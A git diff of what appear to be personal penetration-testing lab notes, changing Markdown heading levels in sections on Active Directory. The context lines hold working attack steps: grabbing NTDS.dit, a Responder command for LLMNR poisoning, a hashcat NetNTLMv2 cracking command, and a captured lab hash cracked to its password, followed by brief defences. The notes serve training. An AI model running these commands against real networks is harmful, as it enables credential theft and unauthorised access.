@@ -181,7 +181,7 @@ C:\Windows\NTDS\Ntds.dit
 always check for this file and grab it. only accessible through the domian controller and contains everything in Active Directory. 
 
 
-## LLMNR Poisoning: 
+# LLMNR Poisoning: 
 #### Responder:
 gather hashes over the network passively 
 ```
@@ -196,7 +196,7 @@ sudo python /usr/share/responder/Responder.py -I eth0 -rdw -v
 ```
 save hashses to file called hashes.txt
 
-#### Hashcat:
+## Hashcat:
 using the password file rockyou.txt and the NTLM module to crack passwords
 ```
 hashcat -m 5600 hashes.txt rockyou.txt --force
@@ -296,7 +296,7 @@ at the end of the hash it now shows the users actual password.
 ```
 PPARKER::MARVEL:abd8996fdc62d49e:7d7620fa7e88954ec8421d26f071f9ee:010100000000000052fde297a177d701a7ef1960cf99e37700000000020008003100340035004d0001001e00570049004e002d0037004d004d005900380038004400490051004700580004003400570049004e002d0037004d004d00590038003800440049005100470058002e003100340035004d002e004c004f00430041004c00030014003100340035004d002e004c004f00430041004c00050014003100340035004d002e004c004f00430041004c0008003000300000000000000000000000003000006fbf0641ae8081eadf6d920dadef058df615773394bc78a6a5676b0f47fb4a510a00100000000000000000000000000000000000090040005200500043002f00570049004e002d0037004d004d00590038003800440049005100470058002e004d0041005200560045004c002e006c006f00630061006c000000000000000000:Password2 
 ```
-##### LLMNR Poisoning Defense:
+### LLMNR Poisoning Defense:
 1. Disable LLMNR
 2. Disable NBT-NS
 3. Require Network Access Control
